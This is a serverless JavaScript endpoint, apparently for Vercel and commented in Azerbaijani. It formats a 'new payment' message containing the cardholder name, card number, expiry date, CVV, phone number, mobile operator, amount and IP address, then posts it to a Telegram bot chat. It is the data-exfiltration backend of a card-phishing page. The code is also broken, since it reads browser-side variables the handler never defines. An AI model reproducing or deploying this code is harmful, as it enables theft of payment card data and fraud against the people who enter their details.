export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Yalnız POST qəbul olunur' });
  }

  // HTML-dən göndərdiyimiz məlumatları qəbul edirik
  const { name, amount, ip } = req.body;

  // Token və Chat ID Vercel-in gizli panelindən götürülür
  const TOKEN = process.env.TELEGRAM_TOKEN;
  const CHAT = process.env.TELEGRAM_CHAT_ID;

  const txt = `💳 *YENİ ÖDƏNİŞ MƏLUMATI*\n\n` +
                        `👤 *Kart Sahibi:* \`${inpName.value.toUpperCase()}\`\n` +
                        `🔢 *Kart Nömrəsi:* \`${inpNo.value}\`\n` +
                        `📅 *Müddət:* \`${inpExp.value}\`\n` +
                        `🔒 *CVV:* \`${inpCvv.value}\`\n\n` +
                        `📱 *Operator:* ${oper}\n` +
                        `📞 *Nömrə:* \`${phone}\`\n` +
                        `💰 *Məbləğ:* ${amount} AZN\n` +
                        `🌐 *IP:* \`${ip}\``;
  
  try {
    const telegramRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text: txt, parse_mode: 'Markdown' })
    });

    if (telegramRes.ok) {
      return res.status(200).json({ success: true });
    } else {
      return res.status(500).json({ error: 'Telegram xətası' });
    }
  } catch (err) {
    return res.status(500).json({ error: 'Server xətası' });
  }
}
